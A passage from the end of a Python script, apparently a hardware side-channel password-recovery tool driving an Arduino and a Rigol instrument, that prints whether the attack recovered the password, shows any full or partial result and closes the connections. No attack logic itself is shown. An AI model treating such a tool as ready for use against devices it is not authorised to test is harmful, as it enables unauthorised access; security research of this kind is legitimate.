        print(f"{Fore.GREEN + Style.BRIGHT}✅ ATTACK SUCCESSFUL!{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Password: {Fore.YELLOW + Style.BRIGHT}{''.join(found_password)}{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED + Style.BRIGHT}❌ ATTACK FAILED{Style.RESET_ALL}")
        if found_password:
            print(f"{Fore.WHITE}Partial: {Fore.YELLOW}{''.join(found_password)}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    
    print_final_stats()
    
    arduino.close()
    rigol.close()
    
    log("Connections closed. Exiting.", level="INFO")